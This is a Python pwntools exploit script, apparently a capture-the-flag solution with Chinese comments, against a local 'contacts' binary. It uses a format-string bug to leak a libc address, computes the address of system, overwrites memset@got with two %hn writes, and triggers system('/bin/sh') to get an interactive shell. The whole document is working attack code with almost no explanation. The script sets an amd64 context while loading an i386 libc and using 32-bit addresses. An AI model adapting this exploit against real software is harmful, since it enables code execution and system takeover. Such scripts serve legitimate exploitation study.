from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p    = process('./contacts')
elf  = ELF('./contacts')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

memset_got = elf.got['memset']

# 通讯录操作
def create(name, number, description):
    p.sendline('1')
    p.recvuntil('Name: ')
    p.sendline(name)
    p.recvuntil('Enter Phone No: ')
    p.sendline(number)
    p.recvuntil('Length of description: ')
    p.sendline(str(len(description)))
    p.recvuntil('Enter description:\n\t\t')
    p.send(description)
def remove(name):
    p.sendline('2')
    p.recvuntil('Name to remove? ')
    p.sendline(name)
def edit(name, description):
    p.sendline('3')
    p.recvuntil('Name to change? ')
    p.sendline(name)
    p.recvuntil('1.Change name\n2.Change description\n>>> ')
    p.sendline('2')
    p.recvuntil('Length of description: ')
    p.sendline(str(len(description) + 1))
    p.recvuntil('Description: \n\t')
    p.send(description)
def display():
    p.sendline('4')
    p.recvuntil('Description: ')
# 格式化字符串对栈读取
def getaddr(stack_num):
    p.recvuntil('>>> ')
    edit(b'AAAA', b'%' + bytes(str(stack_num), 'utf-8') + b'$paaaa')
    p.recvuntil('>>> ')
    display()
    return int(p.recvuntil('aaaa')[:10], 16)
# 格式化字符串对栈写入
def putaddr(stack_num, number, l):
    p.recvuntil('>>> ')
    edit(b'AAAA', b'%' + bytes(str(number), 'utf-8') + b'c%' + bytes(str(stack_num), 'utf-8') + b'$' + l)
    p.recvuntil('>>> ')
    display()

#gdb.attach(p, 'b *0x08048C22\n')

# 获取libc基地址, 计算system地址
p.recvuntil('>>> ')
create(b'AAAA', b'aaaa', b'aaaaaaaa')    # 用于写入数据的通讯录
create(b'/bin/sh\x00', b'bbbb', b'bbbb') # 用于触发system的通讯录

libc_start_main = getaddr(55) - 147
libc_base   = libc_start_main - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']

#0xff9b1cc4 -> 0xff9b1d74 -> 0xff9b13f4
#0xff9b1cd4 -> 0x80486bd
stack_d74 = getaddr(33)                             # 读取栈上的地址
stack_cd4 = stack_d74 - 0xa0
putaddr(33, stack_cd4 & 0xFFFF, b'hn')              # 修改地址形成连续指向的地址
#0xff9b1cc4 -> 0xff9b1d74 -> 0xff9b1cd4 -> 0x80486bd
putaddr(77, memset_got & 0xFFFF, b'hn')             # 修改地址指向memset@got
putaddr(37, system_addr & 0xFFFF, b'hn')            # 将system低两位写入
putaddr(77, (memset_got + 2) & 0xFFFF, b'hn')       # 修改地址指向memset@got+2
putaddr(37, (system_addr & 0xFFFF0000)>>16, b'hn')  # 将system高两位写入

# 触发漏洞
remove(b'/bin/sh\x00')
p.interactive()